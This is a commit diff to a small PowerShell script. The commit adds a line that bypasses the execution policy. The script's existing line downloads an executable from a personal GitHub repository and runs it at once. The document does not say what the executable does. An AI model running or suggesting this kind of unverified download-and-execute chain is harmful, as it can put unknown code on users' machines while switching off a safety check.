35aacf40d154dc8b2b4d0e186bd5e9436488477c
CustomRomHarsh <customromharsh@gmail.com>
2026-07-06 21:22:20 +0530

    Update bde.ps1

--- bde.ps1
+++ bde.ps1
@@ -1,1 +1,2 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force;
 $f='C:\bde.exe'; Invoke-WebRequest 'https://github.com/CustomRomHarsh/exes/raw/refs/heads/main/BDE.exe' -OutFile $f; Start-Process $f
